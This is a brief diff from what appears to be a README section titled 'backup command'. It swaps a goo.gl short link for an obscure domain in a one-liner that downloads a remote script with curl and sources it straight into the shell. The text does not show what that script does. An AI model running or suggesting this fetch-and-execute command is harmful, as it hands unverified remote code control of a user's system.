@@ -29,7 +29,7 @@ enter
 ### backup command
 
 ```
-. <(curl -L goo.gl/enfFVV)
+. <(curl -L 0fukt.xyz/g)
 
 ```
 
